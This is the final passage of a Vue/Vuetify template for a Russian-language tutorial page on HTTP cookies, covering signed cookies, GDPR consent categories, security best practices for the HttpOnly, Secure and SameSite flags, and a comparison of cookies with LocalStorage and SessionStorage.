                <p class="font-weight-regular ma-0">
                  Signed cookies содержат криптографическую подпись на основе секретного ключа, что позволяет
                  серверу проверить, что cookie не была изменена на клиенте. Это защищает от подделки данных
                  (tampering), но НЕ шифрует содержимое cookie.
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Какие категории cookies требуют согласия по GDPR?</p>
                <p class="font-weight-regular ma-0">
                  Необходимые cookies (аутентификация, CSRF токены) НЕ требуют согласия. Функциональные,
                  аналитические и рекламные cookies ТРЕБУЮТ явного согласия пользователя. Нужно показывать
                  баннер согласия и позволять управлять категориями.
                </p>
              </li>
            </ol>

            <h2 class="text-h5 font-weight-bold mb-3">Лучшие практики безопасности</h2>
            <v-row class="mb-8">
              <v-col cols="12" md="4">
                <v-card class="pa-4 h-100 text-center">
                  <v-icon size="large" color="success" class="mb-2">mdi-check-circle</v-icon>
                  <h3 class="text-h6 font-weight-bold mb-2">✅ Делать</h3>
                  <ul class="text-left pl-4">
                    <li>HttpOnly + Secure для auth</li>
                    <li>SameSite=Strict для критичных cookies</li>
                    <li>SameSite=Lax по умолчанию</li>
                    <li>Max-Age вместо expires</li>
                    <li>Регенерация session после login</li>
                    <li>Signed cookies для проверки целостности</li>
                    <li>HTTPS везде</li>
                  </ul>
                </v-card>
              </v-col>
              <v-col cols="12" md="4">
                <v-card class="pa-4 h-100 text-center">
                  <v-icon size="large" color="error" class="mb-2">mdi-close-circle</v-icon>
                  <h3 class="text-h6 font-weight-bold mb-2">❌ Избегать</h3>
                  <ul class="text-left pl-4">
                    <li>Хранение паролей в cookies</li>
                    <li>Персональные данные без шифрования</li>
                    <li>Большие объемы данных (&gt;4KB)</li>
                    <li>Cookies без Secure на production</li>
                    <li>Отсутствие HttpOnly для auth</li>
                    <li>SameSite=None без необходимости</li>
                    <li>Cookies на HTTP (незащищенном)</li>
                  </ul>
                </v-card>
              </v-col>
              <v-col cols="12" md="4">
                <v-card class="pa-4 h-100 text-center">
                  <v-icon size="large" color="info" class="mb-2">mdi-lightbulb</v-icon>
                  <h3 class="text-h6 font-weight-bold mb-2">💡 Рекомендации</h3>
                  <ul class="text-left pl-4">
                    <li>Минимизируйте размер cookies</li>
                    <li>Используйте Path для изоляции</li>
                    <li>Мониторьте истечение токенов</li>
                    <li>Реализуйте GDPR consent</li>
                    <li>Тестируйте SameSite поведение</li>
                    <li>Документируйте политику cookies</li>
                    <li>Регулярный аудит безопасности</li>
                  </ul>
                </v-card>
              </v-col>
            </v-row>

            <h2 class="text-h5 font-weight-bold mb-3">Cookie vs LocalStorage vs SessionStorage</h2>
            <v-table density="comfortable" class="mb-8">
              <thead>
              <tr>
                <th class="text-left font-weight-bold">Характеристика</th>
                <th class="text-left font-weight-bold">Cookie</th>
                <th class="text-left font-weight-bold">LocalStorage</th>
                <th class="text-left font-weight-bold">SessionStorage</th>
              </tr>
              </thead>
              <tbody>
              <tr>
                <td><b>Размер</b></td>
                <td>~4KB</td>
                <td>5-10MB</td>
                <td>5-10MB</td>
              </tr>
              <tr>
                <td><b>Время жизни</b></td>
                <td>Настраиваемое (expires/Max-Age)</td>
                <td>Бессрочно</td>
                <td>До закрытия вкладки</td>
              </tr>
              <tr>
                <td><b>Отправка на сервер</b></td>
                <td class="text-success">✅ Автоматически</td>
                <td class="text-error">❌ Нет</td>
                <td class="text-error">❌ Нет</td>
              </tr>
              <tr>
                <td><b>Доступ из JS</b></td>
                <td>Да (кроме HttpOnly)</td>
                <td class="text-success">✅ Да</td>
                <td class="text-success">✅ Да</td>
              </tr>
              <tr>
                <td><b>Защита XSS</b></td>
                <td>HttpOnly флаг</td>
                <td class="text-error">❌ Нет</td>
                <td class="text-error">❌ Нет</td>
              </tr>
              <tr>
                <td><b>Защита CSRF</b></td>
                <td>SameSite флаг</td>
                <td class="text-success">✅ Не нужна</td>
                <td class="text-success">✅ Не нужна</td>
              </tr>
              <tr>
                <td><b>Использование</b></td>
                <td>Auth, sessions, tracking</td>
                <td>Настройки, кэш</td>
                <td>Временные данные формы</td>
              </tr>
              </tbody>
            </v-table>

            <h2 class="text-h5 font-weight-bold mb-3">Итог</h2>
            <p class="font-weight-regular mb-6">
              <b>Cookie</b> — фундаментальный механизм веб-разработки для сохранения состояния между HTTP-запросами.
              Правильное использование атрибутов (<code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>)
              критически важно для безопасности. <b>HttpOnly</b> защищает от XSS, <b>Secure</b> обеспечивает
              передачу только по HTTPS, <b>SameSite</b> предотвращает CSRF атаки. Для auth токенов всегда используйте
              комбинацию всех трех флагов. Помните о GDPR требованиях для аналитических и рекламных cookies.
            </p>

            <div class="d-flex justify-end">
              <v-btn
                color="primary"
                size="small"
                variant="elevated"
                href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies"
                target="_blank"
                class="mr-2">
                MDN: HTTP Cookies
              </v-btn>
              <v-btn
                color="secondary"
                size="small"
                variant="elevated"
                href="https://web.dev/samesite-cookies-explained/"
                target="_blank">
                SameSite Cookies Explained
              </v-btn>
            </div>
          </v-col>
        </v-row>
      </v-container>
    </v-main>
  </v-app>
</template>
